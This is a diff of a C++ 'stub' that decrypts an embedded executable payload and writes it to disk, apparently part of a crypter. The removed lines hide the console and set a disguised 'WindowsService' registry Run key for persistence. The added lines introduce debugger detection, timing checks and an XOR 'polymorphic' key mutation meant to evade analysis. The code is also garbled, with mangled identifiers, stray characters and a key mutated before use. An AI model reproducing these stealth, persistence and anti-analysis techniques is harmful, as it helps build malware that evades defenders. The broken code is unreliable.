@@ -11,35 +11,46 @@
 #include <chrono>
 #include <thread>
 
-#ifdef _WIN32
-#include <windows.h>
-#endif
+// Standalone Advanced Stub - Anti-debugging + Polymorphism
+const std::string KEY_Az9VhmMs = "c636e782c5c2dfa97443da084c151c49";
+const std::string NONCE_jN9VDHSJ = "6eca724a7b4d622b1f066b21909c1cb2";
 
-// Standalone Stealth Stub - Silent operation + Auto-startup
-const std::string KEY_tpP3NaE6 = "e166896183c7d6906fbd8d48f92e1fce";
-const std::string NONCE_emjxG61X = "e761c27e138d8e40b4351acb206807eb";
-
-// Stealth features
-void setupAutoStartup() {
-    #ifdef _WIN32
-    HKEY hKey;
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+// Anti-debugging and polymorphic features
+class PolymorphicEngine {
+private:
+    static const uint32_t POLY_KEY = 0xDEADBEEF;
     
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
-            (const BYTE*)exePath, strlen(exePath) + 1);
-        RegCloseKey(hKey);
+public:
+    static uint8_t mutateByte(uint8_t byte, uint32_t seed) {
+        return byte ^ ((seed * POLY_KEY) & 0xFF);
     }
+    
+    static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
+        for (size_t i = 0; i < size; i++) {
+            data[i] = mutateByte(data[i], seed + i);
+        }
+    }
+    
+    static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
+        mutateArray(data, size, seed); // XOR is symmetric
+    }
+};
+
+// Anti-debugging checks
+bool isDebuggerPresent() {
+    #ifdef _WIN32
+    return IsDebuggerPresent();
+    #else
+    return false;
     #endif
 }
 
-void hideConsole() {
-    #ifdef _WIN32
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-    #endif
+bool checkTiming() {
+    auto start = std::chrono::high_resolution_clock::now();
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    auto end = std::chrono::high_resolution_clock::now();
+    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+    return duration.count() < 95; // If too fast, likely debugger
 }
 
 // AES-128-CTR implementation (same as basic)
@@ -172,30 +183,40 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    // Stealth mode - hide console
-    hideConsole();
+    // Anti-debugging checks
+    if (isDebuggerPresent() || checkTiming()) {
+        return 1; // Exit if debugger detected
+    }
     
-    // Setup auto-startup
-    setupAutoStartup();
-    
-    // Embedded encrypted executable data
-const uint8_t embeddedData[] = {0xe3, 0x83, 0xb8, 0x41, 0xcf, 0xb5, 0x05, 0x98, 0x6c, 0x5c, 0xef, 0x76, 0x9e, 0x33, 0x2b, 0x0b, 0x9f, 0x14, 0x4a, 0x90, 0x92, 0xce, 0xbc, 0xa5, 0x00, 0x38, 0xa1, 0x9c, 0x33, 0x2d, 0x53, 0x59, 0x93, 0xd9, 0x62, 0x34, 0x81, 0xce, 0xf1, 0xc1, 0xfb, 0x5f, 0xec, 0x4a, 0xb6, 0x70, 0xfa, 0xee, 0xaa, 0x9f, 0x74, 0xb9, 0x42, 0xbe, 0xf2, 0xc3, 0x74, 0xcd, 0xdf, 0xd9, 0x97, 0x20, 0x70, 0xe5, 0x15, 0xf4, 0x0d, 0xee, 0xbd, 0x0b, 0x2a, 0x7c, 0x37, 0xc9, 0x79, 0xbb, 0x88, 0x01, 0x24, 0x90, 0x34, 0xda, 0xd9, 0x4a, 0x20, 0xf4, 0x42, 0x69, 0x3a, 0x2d, 0xd6, 0x56, 0x38, 0xc9, 0xab, 0x85, 0xf2, 0x3a, 0xf6, 0x3b, 0x92, 0x27, 0xac, 0x59, 0xa1, 0xe6, 0xea, 0x41, 0xe3, 0xb3, 0xcf, 0x28, 0x62, 0xf0, 0x3b, 0x5e, 0x64, 0x56, 0xee, 0xc3, 0x0e, 0x50, 0x62, 0xda, 0x4e};
-const size_t embeddedDataSize = sizeof(embeddedData);ta
+    // Standalone stub - no embedded data
     // Standalone stub - no embedded data}
     
     // Convert hex strings to bytes
     uint8_t key[16], nonce[16];
-    hexToBytes(Y_tpP3NaE6, key);
-    hexToBytes(E_emjxG61X, nonce);
+    hexToBytes(KEY_Az9VhmMs, key);
+    hexToBytes(NONCE_jN9VDHSJ, nonce);
+    
+    // Polymorphic mutation/demutation
+    uint32_t seed = std::time(nullptr);
+    PolymorphicEngine::mutateArray(key, 16, seed);
+    PolymorphicEngine::mutateArray(nonce, 16, seed);
     
     // Decrypt the data using AES-128-CTR
     aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
     
-    // Write decrypted data to file (silent)
+    // Demutate the key and nonce
+    PolymorphicEngine::demutateArray(key, 16, seed);
+    PolymorphicEngine::demutateArray(nonce, 16, seed);
+    
+    // Write decrypted data to file
     std::ofstream outFile("decrypted_output.bin", std::ios::binary);
     if (outFile.is_open()) {
         outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
         outFile.close();
+        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    } else {
+        std::cerr << "Failed to create output file" << std::endl;
+        return 1;
     }
     
     return 0;
